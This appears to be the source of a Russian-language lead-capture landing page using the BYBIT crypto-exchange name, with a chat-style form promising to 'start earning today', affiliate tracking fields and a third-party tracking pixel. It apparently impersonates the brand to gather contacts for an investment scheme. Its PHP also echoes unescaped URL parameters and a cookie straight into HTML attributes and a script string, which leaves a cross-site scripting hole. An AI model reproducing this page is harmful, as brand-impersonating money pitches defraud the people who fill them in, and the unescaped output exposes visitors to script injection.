<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BYBIT</title>
    <link rel="icon" href="img/icons/logo.svg" type="image/x-icon" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Raleway:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="chat.css" />

    <script src="jquery-3.6.1.min.js"></script>

    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      window.bgdataLayer = window.bgdataLayer || [];

      function bge() {
          bgdataLayer.push(arguments);
      }
      bge('init', '<?= $_COOKIE['bge'] ?>');
    </script>
    <script
      async
      src="https://api.imotech.video/ad/events.js?pixel_id=<?= $_COOKIE['bge'] ?>"
    ></script>
    
  </head>
  <body>
    <header class="header">
      <div class="header-container">
        <div class="header-heading">
          <img src="img/icons/logo.png" alt="Logo" />
        </div>
      </div>
    </header>
    <main class="main">
      <span class="messages-date">Сегодня</span>
      <div class="main-messages"></div>
      <form
        class="form _main-form contact-form freg thin rounded"
        id="main-form"
        method="post"
        style="
          padding: 20px;
          margin: 20px 20px;
          border-radius: 20px;
          background-color: #fff;
          display: none;
        "
      >
        <h2 class="form-heading">
          Оставь заявку и начни зарабатывать уже сегодня!
        </h2>
        <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
        <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
        <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
        type="hidden" id="bge" value='<?= $_COOKIE['bge'] ?>'> <input type="hidden"
        id="source" value='<?= $_GET['source'] ?>'>
      </form>
    </main>
    <!-- <footer class="footer">
      <div class="footer-container">
        <div class="footer-menu">
          <img src="img/icons/Menu-Icon.svg" alt="Menu" />
          <span class="footer-menu-text">Меню</span>
        </div>
        <div class="footer-input">
          <img src="img/icons/Cursor.svg" alt="Cursor" />
          <span class="footer-input-placeholder">Сообщение</span>
        </div>
      </div>
      <div class="footer-send">
        <img src="img/icons/send.svg" alt="Send" />
      </div>
    </footer> -->
    <script type="module" src="chat.js?v=35"></script>

    <script src="loadAssets.js?v=76895675"></script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
